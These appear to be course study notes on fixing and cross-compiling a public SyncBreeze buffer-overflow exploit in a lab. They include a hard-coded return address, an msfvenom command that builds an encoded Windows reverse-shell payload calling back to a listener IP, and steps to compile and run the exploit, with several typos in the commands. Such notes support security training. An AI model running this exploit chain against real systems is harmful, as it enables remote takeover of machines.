## 13.1 Fixing Memory Corruption Exploits
### 13.1.3. Cross-Compiling Exploit Code

#### Installing the mingw-w64 cross-compiler in Kali
```Shell
sudo apt install mingw-w64
```
#### Using mingw-w64 to compile the code into a Windows Portable Executable (PE) file
```Shell
i686-w64-mingw32-gcc 42341.c -o synchbreeze_exploit.exe
```

#### If errors are encountered, Google to determine fix. Example: linker missing in winsock library
```Shell
i6868-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe -lws2_32
```
This time, mingw32 produced an executable without generating any compilation errors. With the _-l_ option, we can instruct mingw-w64 to search for the _ws2_32_ DLL and include it in the final executable via static linking

### 13.1.4. Fixing the Exploit

#### Verify return address
- Launch Immunity Debugger as administrator
- Click on *File > Attach*
- Select the *syncbrs* process
- Once attached, click on the *View* menu
- Click on *Executable Modules*
- Verify that **msvbvm60.dll** is not present by checking *Name* and *Path* values
#### Changing the Return Address
```
unsigned char retn[] = "\x83\x0c\x09\x10"; // 0x10090c83
```

If we do not have a return address from a previously-developed exploit, we have a few options to consider. The first, and most recommended option, is to recreate the target environment locally and use a debugger to determine this address.

#### Using msfvenom to generate a reverse shell payload that fits our environment
```Shell
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.50.4 LPORT=443 EXITFUNC=threat -f c -e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d"
```

#### Compile the exploit code using mingw-w64 to determine if it generates any errors
```Shell
i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe -lws2_32
```

#### Use wine to run a Windows exploit from Kali
```Shell
sudo wine syncbreeze_exploit.exe
```

## 13.2. Fixing Web Exploits

### 13.2.2. Selecting the Vulnerability and Fixing the Code

